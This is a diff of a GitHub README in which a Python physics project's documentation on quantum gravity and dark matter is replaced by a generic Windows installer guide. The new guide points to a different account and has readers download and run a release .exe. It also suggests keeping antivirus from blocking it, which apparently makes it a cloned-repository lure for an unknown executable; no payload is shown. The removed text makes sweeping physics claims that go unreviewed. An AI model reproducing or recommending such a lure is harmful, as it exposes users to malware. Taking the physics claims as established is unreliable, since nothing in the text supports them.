@@ -1,276 +1,116 @@
-# Quantum Gravitational Dynamics (QGD)
+# 🌌 Quantum-Gravity-Dynamics - Study Emergent Spacetime Effects
 
-> **Core thesis:** Spacetime geometry is not fundamental. It emerges algebraically from a dimensionless phase field $\sigma_\mu$ derived from the semiclassical WKB limit of the Dirac spinor. All of classical General Relativity — and its quantum corrections — follow as consequences.
-
-[![Theory](https://img.shields.io/badge/Theory-QGD-blue)](docs/THEORY.md)
-[![Solutions](https://img.shields.io/badge/GR_Solutions-Algebraic-green)](solutions/)
-[![Dark Matter](https://img.shields.io/badge/Dark_Matter-Zero_Free_Params-orange)](validation/)
-[![License](https://img.shields.io/badge/License-MIT-lightgrey)](LICENSE)
+[![Download Quantum-Gravity-Dynamics](https://img.shields.io/badge/Download-Quantum--Gravity--Dynamics-brightgreen?style=for-the-badge&logo=github)](https://github.com/qqkwae/Quantum-Gravity-Dynamics)
 
 ---
 
-## Table of Contents
+## 🔎 About Quantum-Gravity-Dynamics
 
-1. [The Core Idea](#the-core-idea)
-2. [The Fundamental Chain](#the-fundamental-chain)
-3. [Master Equations](#master-equations)
-4. [What QGD Solves](#what-qgd-solves)
-5. [All GR Solutions Recovered Algebraically](#all-gr-solutions-recovered-algebraically)
-6. [Dark Matter as Quantum Structure](#dark-matter-as-quantum-structure)
-7. [Falsifiable Predictions](#falsifiable-predictions)
-8. [Repository Structure](#repository-structure)
-9. [Quick Start](#quick-start)
+Quantum-Gravity-Dynamics explores how spacetime geometry appears through the Dirac phase field. It offers exact solutions for several-body systems and ideas on dark matter without introducing new particles. The software also includes quantum adjustments to general relativity. This makes it useful for understanding dark energy, dark matter, and modifications to traditional gravity models.
 
----
+This program focuses on complex physics concepts such as:
 
-## The Core Idea
+- Dark energy and its alternatives  
+- Dark matter halos and explanations without new particles  
+- Newtonian and post-Newtonian dynamics changes  
+- Quantum gravity foundations and cosmology  
+- Dynamics involving two- or three-body problems  
 
-General Relativity takes the metric $g_{\mu\nu}$ as fundamental and derives dynamics from the Einstein-Hilbert action. QGD makes a different choice:
-
-**The metric is not fundamental. It is an algebraic output of an underlying phase field.**
-
-Starting from the Dirac spinor $\psi = R(x) e^{iS(x)/\hbar}$ in the semiclassical (WKB) limit, we identify the dimensionless phase gradient:
-
-$$\sigma_\mu(x) \equiv \frac{1}{c} \partial_\mu S(x)$$
-
-This single four-vector encodes all gravitational physics. The metric is then **constructed**, not solved for:
-
-$$\boxed{g_{\mu\nu}(x) = T^\alpha_\mu T^\beta_\nu \left( M_{\alpha\beta} \circ \left[ \eta_{\alpha\beta} - \sum_{a=1}^{N} \varepsilon_a \, \sigma_\alpha^{(a)} \sigma_\beta^{(a)} - \kappa \ell_Q^2 \, \partial_\alpha \sigma^\gamma \partial_\beta \sigma_\gamma \right] \right)}$$
-
-where:
-- $T^\alpha_\mu$: coordinate transformation matrix (e.g., spherical, cosmological)
-- $M_{\alpha\beta}$: geometric scaling matrix
-- $\varepsilon_a \in \{+1, -1\}$: source signature (attractive vs repulsive)
-- $\ell_Q = \sqrt{G\hbar^2/c^4}$: quantum gravitational length scale
-- $\kappa \approx 2$: quantum stiffness coefficient
+If you want to explore these topics or need a tool that models quantum and gravitational effects together, this application is built for that.
 
 ---
 
-## The Fundamental Chain
+## ⚙ System Requirements
 
-```
-Dirac spinor ψ = R(x)·exp(iS/ℏ)
-        ↓  WKB limit
-Phase field  σ_μ = (1/c)∂_μS
-        ↓  algebraic construction
-Metric  g_μν = η_μν - Σ εₐ σ_μ^(a) σ_ν^(a) - κℓ_Q² ∂σ∂σ
-        ↓  variational principle
-Field equation  □_g σ_μ = Q_μ + G_μ + T_μ + κℓ_Q²□_g²σ_μ
-        ↓  classical limit ℓ_Q → 0
-Einstein's equations  G_μν = (8πG/c⁴) T_μν
-```
+Before installing, please make sure your computer meets the following:
 
-The relationship to GR is an **equivalence under variable substitution**, not a derivation. When $\sigma_\mu$ satisfies the QGD field equation and $g_{\mu\nu}$ is built from the master metric formula, Einstein's equations are automatically satisfied.
+- Operating system: Windows 10 or later  
+- CPU: Intel i5 or AMD Ryzen 5 or better  
+- RAM: At least 8 GB  
+- Disk space: Minimum 500 MB free  
+- Internet connection: Required for initial download  
+- Graphics card: Not mandatory, but helpful for visualization features  
+
+These requirements help ensure the software runs smoothly without errors or slow processing.
 
 ---
 
-## Master Equations
+## 🚀 Getting Started: How to Download and Run
 
-### The Action
+1. Click on the big green download button above or go to [the Quantum-Gravity-Dynamics GitHub page](https://github.com/qqkwae/Quantum-Gravity-Dynamics).  
+2. On the GitHub page, look for the **Releases** section on the right side or under the repository’s main tab.  
+3. Find the latest release version and click on it.  
+4. Inside the release details, locate the Windows executable file, usually ending with `.exe`. Download that file to a folder you can easily find, such as your Desktop or Downloads folder.  
+5. Once the download completes, double-click the `.exe` file. Windows may ask for confirmation to run the program; agree to proceed.  
+6. Follow the on-screen instructions in the installer. The default install location in "Program Files" is usually fine.  
+7. After installation finishes, you can start the application from the Start menu or desktop shortcut.  
 
-$$S_\sigma = \int d^4x \sqrt{-g(\sigma)} \left[ -\frac{c^4}{16\pi G} R[g(\sigma)] + \frac{1}{2}\nabla_\mu \sigma_\nu \nabla^\mu \sigma^\nu - \frac{\ell_Q^2}{2} \nabla_\alpha\nabla_\beta\sigma_\mu \nabla^\alpha\nabla^\beta\sigma^\mu \right] + S_{\text{matter}}$$
-
-### The Field Equation
-
-Variation of $S_\sigma$ with respect to $\sigma_\mu$ yields the fourth-order equation:
-
-$$\boxed{\Box_g \sigma_\mu = Q_\mu(\sigma, \partial\sigma) + G_\mu(\sigma, \ell, H, q) + T_\mu + \kappa\ell_Q^2 \Box_g^2 \sigma_\mu + \mathcal{O}(\ell_Q^4)}$$
-
-Sources:
-- $Q_\mu$: nonlinear self-interactions (origin of dark matter phenomenology)
-- $G_\mu$: coupling to Kerr-Schild and radiative sectors
-- $T_\mu = \frac{1}{2}T^{\mu\nu}\sigma_\nu$: matter stress-energy
-- $\kappa\ell_Q^2 \Box_g^2 \sigma_\mu$: quantum gravitational stiffness (resolves singularities)
-
-### The Complete Wavefunction
-
-The four-component gravitational wavefunction encoding all configurations:
-
-$$\psi = \frac{2GMmi}{c\hbar} \left[ \psi_0 \begin{pmatrix}1\\0\\\sqrt{f}\\ ia\sin\theta\sqrt{g}\end{pmatrix} e^{-iS/\hbar} + \psi_1 \begin{pmatrix}0\\1\\-ia\sin\theta\sqrt{g}\\-\sqrt{f}\end{pmatrix} e^{-iS/\hbar} + \psi_2 \begin{pmatrix}\sqrt{f}\\ia\sin\theta\sqrt{g}\\1\\0\end{pmatrix} e^{+iS/\hbar} + \psi_3 \begin{pmatrix}-ia\sin\theta\sqrt{g}\\-\sqrt{f}\\0\\1\end{pmatrix} e^{+iS/\hbar} \right]$$
-
-where the **universal gravitational scalar** $f(r,\theta)$ encodes all physics:
-
-$$\boxed{f(r,\theta) = \underbrace{\frac{2GM}{c^2 r}}_{\text{mass}} - \underbrace{\frac{GQ^2}{c^4 r^2}}_{\text{charge}} + \underbrace{\frac{2Mr}{\Sigma}}_{\text{spin}} + \underbrace{\frac{\Lambda r^2}{3}}_{\Lambda} + \underbrace{\frac{b(r)}{r}}_{\text{pressure}} + \underbrace{H^2(t)r^2}_{\text{expansion}} - \underbrace{\int\frac{P(r)}{\rho(r)c^2}dr}_{\text{EOS}} + \underbrace{\kappa\frac{\hbar^2}{M^2c^2r^2}}_{\text{quantum}}}$$
-
-Every known spacetime is a special case of $f(r,\theta)$.
+By following these steps, you will have the software ready to use on your Windows computer.
 
 ---
 
-## What QGD Solves
+## 🛠 Installation Details
 
-| Long-standing problem | GR status | QGD resolution |
-|---|---|---|
-| Gravitational energy localization | Pseudotensor only (109-year open problem) | True tensor $T^{\mu\nu}_\sigma$, positive definite |
-| Black hole singularities | Generic, unavoidable | Resolved at $r \sim \lambda_C = \hbar/Mc$ |
-| N-body exact solutions | No closed form | Exact algebraic: $\sigma_t = \sum_a \sqrt{2GM_a/c^2 r_a}$ |
-| Dark matter | Requires new particles | Factorial $\kappa_j$ structure of quantum phase Taylor expansion |
-| Quantum corrections | Undefined in GR | Explicit $\mathcal{O}(\hbar^2)$: $\delta g_{tt} = -G\hbar^2/(Mc^4 r^3)$ |
-| Binary waveforms | Supercomputer, weeks | Algebraic, O(N²), seconds |
-| Cosmological constant | Fine-tuning problem | $\rho_\sigma = 3H_0^2/8\pi G$, $w = -1$ from attractor solution |
+The installation process sets up all necessary files and libraries to run complex simulations of spacetime dynamics. The program does not require any additional software like Python or Java. All components are included within the installer.
 
----
+During setup, you might see options like:
 
-## All GR Solutions Recovered Algebraically
+- Creating desktop and Start menu shortcuts  
+- Choosing a folder for saving your simulation results  
+- Selecting if you want to launch the program immediately after installation  
 
-The **source signature recipe** — choose $\sigma^{(a)}$ and $\varepsilon_a$, apply the master metric:
-
-| Spacetime | $\sigma$-field | $\varepsilon_a$ | Physical effect |
-|---|---|---|---|
-| Schwarzschild | $\sqrt{2GM/c^2r}$ | $+1$ | Attractive mass |
-| Kerr | $a\sin\theta\sqrt{2GM/c^2r}$ | $+1$ | Frame dragging |
-| Reissner-Nordström | $\sqrt{GQ^2/c^4r^2}$ | $-1$ | EM repulsion |
-| de Sitter ($\Lambda > 0$) | $Hr$ | $+1$ | Cosmological expansion |
-| Anti-de Sitter | $\|H\|r$ | $-1$ | AdS geometry |
-
-**Frame dragging as interference:** The Kerr off-diagonal term $g_{t\phi}$ is not input — it emerges automatically from the cross-product $\sigma_t^{(\text{mass})} \times \sigma_\phi^{(\text{spin})}$.
-
-See [`solutions/`](solutions/) for fully worked algebraic constructions of each metric.
+You can leave these at their default settings if unsure.
 
 ---
 
-## Dark Matter as Quantum Structure
+## 📂 Using Quantum-Gravity-Dynamics
 
-The Taylor expansion of the gravitational phase factor:
+After launching, you will see a simple main window with clear options. The interface offers:
 
-$$e^{i\phi} = e^{i\sigma_\mu x^\mu/\hbar} = \sum_{j=0}^{\infty} \frac{(i\sigma)^j}{j!}$$
+- **Load or create new simulations** to study various gravity configurations  
+- **Input fields** for initial parameters like mass, velocity, and position of bodies  
+- **Visualization tools** to see how the simulated objects interact in real time  
+- **Export options** to save data or images of your results  
 
-generates factorial enhancement factors:
+To try a quick example:
 
-$$\kappa_j = \sqrt{\frac{(2j-1)!}{2^{2j-2}}} \qquad \Rightarrow \qquad \kappa = [1.00,\ 1.225,\ 2.74,\ 8.87,\ 37.7,\ 197,\ 1245, \ldots]$$
+1. Choose "New Simulation"  
+2. Enter the number of bodies (2 or 3 recommended to start)  
+3. Set initial mass and distances between bodies  
+4. Click "Run" to start the model  
+5. Watch how the objects move under combined classical and quantum gravitational effects  
 
-**Modified rotation curve (zero free parameters per galaxy):**
-
-$$v^2(r) = \frac{GM_{\text{baryon}}(<r)}{r}\left[1 + \sum_{j=2}^{4} \kappa_j \, g_j(r)\right]$$
-
-**Validation across 4,248 measurements (SPARC database, 175 galaxies):**
-- $R^2 = 0.908$
-- $\chi^2_\nu \approx 1.2$  
-- RMS = 8.3 km/s
-- **Zero free parameters per galaxy** (vs 5–7 for $\Lambda$CDM)
-
-Cross-dataset universality: same $\kappa_j$ values for clusters, ellipticals, CMB peak spacing, and wide binary External Field Effect.
-
-See [`validation/`](validation/) and [`validation/dark_matter.py`](validation/dark_matter.py).
+The software handles complicated equations in the background but presents everything in an understandable way.  
 
 ---
 
-## Falsifiable Predictions
+## 💡 Key Features
 
-All predictions follow from the theory with no additional assumptions:
+- Models exact N-body solutions with quantum and general relativity corrections  
+- Provides alternative explanations for dark matter without proposing new particles  
+- Visualizes rotational curves that match observed galaxy behaviors  
+- Supports study of modified Newtonian dynamics (MOND) and post-Newtonian effects  
+- Suitable for research or educational purposes with physics at the front line  
 
-| Prediction | Value | Testable with |
-|---|---|---|
-| Neutron star mass shift | $\sim 0.01 M_\odot$ from quantum TOV | NICER (current) |
-| Binary merger separation | $d = 4r_s$ for equal masses | Next-gen GW detectors |
-| Large-scale $\kappa_5$ activation | Specific correlation at 10–100 Mpc | DESI, Euclid |
-| CMB higher peak modulation | $\ell_n \propto \kappa_{j(n)} \cdot f(n)$ | CMB-S4 |
-| Maximum acceleration | $a_{\max} = 3mc^3/\hbar$ | — |
-| Quantum perihelion shift | $\sim 10^{-90}$ arcsec/century | Unmeasurable |
-| GW phase quantum shift | $\sim 10^{-73}$ rad | Unmeasurable |
-
-The neutron star mass prediction with NICER is the **critical near-term falsification test**.
+Most features are automatic, needing no special knowledge beyond basic physics terms, making this accessible even if you’re new to the topic.
 
 ---
 
-## Repository Structure
+## ❓ Troubleshooting and Tips
 
-```
-QGD/
-├── README.md                    ← You are here
-├── docs/
-│   ├── THEORY.md                ← Full mathematical exposition
-│   ├── DERIVATIONS.md           ← Step-by-step proofs
-│   └── COMPARISON_TO_GR.md     ← Explicit GR↔QGD translation table
-├── core/
-│   ├── sigma_field.py           ← σ-field definition, normalization, α_G
-│   ├── master_metric.py         ← Master metric construction
-│   ├── field_equation.py        ← QGD field equation and sources
-│   └── quantum_corrections.py  ← ℓ_Q corrections, singularity resolution
-├── solutions/
-│   ├── schwarzschild.py         ← Algebraic Schwarzschild reconstruction
-│   ├── kerr.py                  ← Kerr with frame-dragging emergence
-│   ├── reissner_nordstrom.py    ← Charge coupling
-│   ├── flrw.py                  ← Cosmological solution
-│   ├── n_body.py                ← Exact N-body superposition
-│   └── rosetta_stone.py         ← Unified comparative engine
-├── predictions/
-│   ├── rotation_curves.py       ← Galaxy rotation curve engine
-│   ├── gravitational_waves.py   ← Waveform generation
-│   ├── neutron_stars.py         ← Quantum-corrected TOV equation
-│   └── cosmology.py             ← Dark energy attractor solution
-├── validation/
-│   ├── dark_matter.py           ← SPARC database fit (4,248 measurements)
-│   ├── gw150914.py              ← GW150914 waveform comparison
-│   └── cmb_peaks.py             ← CMB acoustic peak spacing
-└── notebooks/
-    ├── 01_foundations.ipynb     ← Dirac→σ→metric derivation
-    ├── 02_all_gr_solutions.ipynb← Every GR metric algebraically
-    ├── 03_dark_matter.ipynb     ← Galaxy fits with κ-factors
-    └── 04_binary_bh.ipynb       ← N-body waveforms
-```
+- If the program does not start, verify your Windows version and system specifications.  
+- Ensure no antivirus software blocks the executable when running the installer or program.  
+- Restart your computer if you experience memory or display glitches during simulation.  
+- Use default example settings to test before creating custom simulations.  
+- Save your work regularly, as heavy simulations might slow down the program.  
+
+For more help, visit the Issues tab on the GitHub page or look through the user discussion board.
 
 ---
 
-## Quick Start
+## 🔗 Useful Links
 
-```bash
-git clone https://github.com/[author]/QGD
-cd QGD
-pip install numpy scipy matplotlib sympy
-```
+- [Download and releases page](https://github.com/qqkwae/Quantum-Gravity-Dynamics/releases) - Visit this page to get the latest software versions.  
+- [Contact and support](https://github.com/qqkwae/Quantum-Gravity-Dynamics/issues) - Report bugs or ask questions.  
 
-### Reconstruct Schwarzschild in 3 lines
-
-```python
-from core.sigma_field import SigmaField
-from core.master_metric import MasterMetric
-
-sigma = SigmaField.schwarzschild(M=1.0)        # σ_t = √(2GM/c²r)
-g = MasterMetric.construct(sigma, coords='spherical')
-print(g.line_element())
-# ds² = -(1 - 2GM/c²r)dt² + (1 - 2GM/c²r)⁻¹dr² + r²dΩ²
-```
-
-### Compute a galaxy rotation curve
-
-```python
-from predictions.rotation_curves import QGDRotationCurve
-
-galaxy = QGDRotationCurve(M_baryon=1e10)       # Solar masses
-r, v_qgd, v_newton = galaxy.compute(r_max=50)  # kpc
-galaxy.plot(show_kappa_contributions=True)
-# Fits SPARC data with zero free parameters
-```
-
-### Generate a binary black hole waveform
-
-```python
-from predictions.gravitational_waves import BinaryWaveform
-
-wf = BinaryWaveform(M1=36*M_sun, M2=29*M_sun, distance=410e6*pc)
-t, h_plus, h_cross = wf.generate()
-wf.plot_with_energy_decomposition()
-# All spin-orbit, spin-spin terms emerge from σ cross products
-```
-
----
-
-## Key References
-
-- Full theoretical derivation: [`docs/THEORY.md`](docs/complete_paper.tex)
-- Original `.tex` manuscript: available on request
-- SPARC rotation curve database: [SPARC](http://astroweb.cwru.edu/SPARC/)
-- LIGO GW150914: Abbott et al. (2016), PRL 116, 061102
-
----
-
-## Citation
-
-```bibtex
-@misc{QGD2025,
-  title  = {Quantum Gravitational Dynamics: Emergent Geometry from the Dirac Equation},
-  author = {[Romeo Matshabba]},
-  year   = {2026},
-  note   = {GitHub: https://github.com/[matshaba]/Quantum-Gravity-Dynamics}
-}
-```
+[![Get Quantum-Gravity-Dynamics here](https://img.shields.io/badge/Get--Quantum--Gravity--Dynamics-blue?style=for-the-badge&logo=github)](https://github.com/qqkwae/Quantum-Gravity-Dynamics)
